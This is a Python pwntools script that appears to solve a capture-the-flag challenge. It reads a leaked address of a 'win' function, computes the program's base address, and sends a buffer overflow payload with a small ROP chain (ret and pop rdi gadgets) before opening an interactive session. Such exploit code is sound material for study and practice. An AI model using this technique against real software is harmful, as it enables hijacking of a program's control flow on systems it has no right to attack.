#!/usr/bin/python3

from pwn import *

'''
1. We need to determine the base address with gdb.
Find out where is the address is leaked and break after.
- disassamble main
- break *main+42
2. Examine the leaked address
x 0x55555555522e
3. We learned this is the addess of win
To get the address of base we need to take win function's offset from the leaked address.
'''

e = ELF('./pwnme')
offset = 40

win_offset = e.symbols['win']
p = process('./pwnme')
recved = p.recvline().decode()
address_of_win = int(recved.split('0x')[1], 16)

print(recved)
print(f'Address of win {hex(address_of_win)}')
print(f'Win offset {hex(win_offset)}')
base_address = address_of_win - win_offset
print(f'Base address {hex(base_address)}')

ret = 0x101a
pop_rdi = 0x1323

payload = offset * b'A'
payload += p64(base_address + ret)
payload += p64(base_address + pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(base_address + win_offset)

p.sendline(payload)
p.interactive()
